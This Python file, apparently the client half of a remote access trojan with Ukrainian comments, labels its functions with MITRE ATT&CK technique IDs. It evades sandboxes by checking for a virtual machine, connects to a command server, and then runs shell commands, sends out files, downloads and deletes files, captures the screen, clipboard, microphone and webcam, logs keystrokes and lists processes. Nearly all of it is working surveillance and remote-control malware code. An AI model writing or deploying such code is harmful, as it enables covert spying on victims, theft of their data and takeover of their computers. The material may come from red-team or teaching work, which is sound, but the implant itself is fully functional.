#client
import socket
import ast
import platform
import subprocess
import os
import mss 
import clipboard
import psutil
import sounddevice as sd
import scipy.io.wavfile as wav
import cv2
import time

def check_virtual():
    if platform.system() == 'Windows':
      return '\n0' == subprocess.getoutput('wmic bios get serialnumber')
    elif platform.system() == 'Linux':
       return not subprocess.getoutput('systemd-detect-virt') == 'none'
           

if not check_virtual():
    client = socket.socket() 

    client.connect(("127.0.0.1", 100)) # підключення до серверу  
    client.send("I`m connected!".encode()) # відправка



def get_command(socket):
    command = ast.literal_eval(socket.recv(1024).decode())
    return (command[0], command[1])

def send_to_server(data):
    global client
    size = len(data)
    client.send(str(size).encode())
    data = data.encode()
    sent = 0
    while sent < size:
        client.send(data[sent:sent+1024])
        sent += 1024

    

def T1082(): #SysInfoDisc
    data = f"""
    arch = {platform.machine()}\n
    version = {platform.version()}\n
    platform = {platform.platform()}\n
    processor = {platform.processor()}\n
    """
    send_to_server(data)

def T1059(args): #Command-Line Interface
    data = subprocess.getoutput(args)
    send_to_server(data)

def T1083(args): #File and Directory Discovery
    if(os.path.isfile(args)):
        file = open(args, 'rb')
        data = str(file.read()) # зчитування файлу
        send_to_server(data)
    elif(os.path.isdir(args)):
        data = str(os.listdir(args)) # отримання вмісту папки
        if len(data) > 0:
            send_to_server(data) 
        else:
            send_to_server("Folder empty")
    else:
        send_to_server("Not found")


def T1105(args): #Remote File Copy
    global client
    size = int(client.recv(1024).decode())
    #print(size)
    file = open(args, 'wb')
    sent = 0
    while sent < size:
        data = client.recv(1024)
        file.write(data[sent:sent+1024])
        sent += 1024
    #print("end")
    file.close()

def T1107(args): #File Deletion
    if(os.path.isfile(args)):
        os.remove(args)
        send_to_server(f"{args} have deleted")
    else:
        send_to_server("Not found")

def T1113(): #Screen Capture
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        sct_img = sct.grab(monitor)
        data = mss.tools.to_png(sct_img.rgb, sct_img.size)
    size = len(data)
    #print(size)
    client.send(str(size).encode())
    sent = 0
    i = 0
    while sent < size:
        client.send(data[sent:sent+1024])
        sent += 1024

def T1115(): #Clipboard Data
    data = str(clipboard.paste())
    send_to_server(data)


def T1123(): # Audio Capture
    fs=44100
    duration = 5  # seconds
    myrecording = sd.rec(duration * fs, samplerate=fs, channels=2,dtype='float64')
    #print("Recording Audio")
    sd.wait()
    wav.write("audio.temp", fs, myrecording)
    with open("audio.temp", "rb") as file:
        data = file.read()
        size = len(data)
        client.send(str(size).encode())
        sent = 0
        while sent < size:
            client.send(data[sent:sent+1024])
            sent += 1024
        
    os.remove('audio.temp')

def T1125(): # Video Capture
    vid = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('temp.avi', fourcc, 20.0, (640, 480))   
    t_end = time.time() + 4
    while time.time() < t_end:
        _, frame = vid.read()
        out.write(frame)
    vid.release()
    cv2.destroyAllWindows() # De-allocate any associated memory usage

    with open("temp.avi", "rb") as file:
        data = file.read()
        size = len(data)
        print(size)
        client.send(str(size).encode())
        sent = 0
        while sent < size:
            client.send(data[sent:sent+1024])
            sent += 1024
        
def T1056(): # Input Capture 
    from pynput import keyboard
    global keys
    global end_time
    end_time = time.time() + 5
    keys = "" 
    def On_press(key):
        global keys 
        global end_time
        if time.time() > end_time:
            return False 
        keys+=str(key) + ' '
    with keyboard.Listener(on_press=On_press) as listener:
        listener.join()
    data = str(keys)
    send_to_server(data)

def T1057(): # Process Discovery
    process = ''
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        process = process + f"pid = {proc.info['pid']}, name = {proc.info['name']}, \
            username = {proc.info['username']}" + "\n"
    send_to_server(process)


while client.connect and not check_virtual():
    # отримання команди з серверу
    command, args = ast.literal_eval(client.recv(1024).decode())
    print(command)
    print(args)

    if command == "T1082":
        T1082()
    elif command == "T1059":
        T1059(args)
    elif command == "T1083":
        T1083(args)    
    elif command == "T1105":
        T1105(args)
    elif command == "T1107":
        T1107(args)
    elif command == "T1113":
        T1113()
    elif command == "T1115":
        T1115()
    elif command == "T1057":
        T1057()         
    elif command == "T1123":
        T1123()
    elif command == "T1125":
        T1125() 
        os.remove('temp.avi')
    elif command == "T1056":
        T1056()       
    else:
        send_to_server("Error")